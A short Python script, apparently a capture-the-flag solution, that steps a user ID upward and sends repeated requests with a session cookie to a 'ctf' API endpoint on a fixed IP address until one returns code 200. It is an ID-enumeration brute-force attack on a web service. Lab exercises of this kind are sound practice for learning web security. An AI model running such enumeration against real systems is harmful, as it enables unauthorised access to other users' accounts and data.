import requests
import json
uid = 100336889
headers = {
    "Cookie": "session=",
    "Referer": "http://45.113.201.36/user.html",
    "User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.51"
}
while True:
    resp = requests.get("http://45.113.201.36/api/ctf/5?uid="+str(uid), headers=headers)
    print(uid)
    print(resp.text)
    jsonobj = json.loads(resp.text)
    if jsonobj['code'] == 200:
        break
    else:
        uid += 1

        continue
print("finish")